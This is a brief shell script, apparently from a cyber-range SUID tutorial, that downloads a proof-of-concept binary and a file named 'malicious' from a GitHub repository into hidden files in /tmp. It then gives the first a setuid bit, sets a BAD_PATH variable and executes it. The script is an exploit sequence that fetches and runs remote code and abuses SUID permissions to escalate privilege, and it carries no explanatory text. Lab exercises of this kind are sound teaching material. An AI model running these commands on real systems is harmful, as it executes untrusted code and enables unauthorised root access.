wget -O /tmp/.poc https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/poc; 
wget -O /tmp/.malicious https://raw.githubusercontent.com/cappetta/CyberRange/master/tutorials/seed/suid/malicious; 

chmod 4755 /tmp/.poc;
chmod 755 /tmp/.malicious; 
export BAD_PATH=/tmp; /tmp/.poc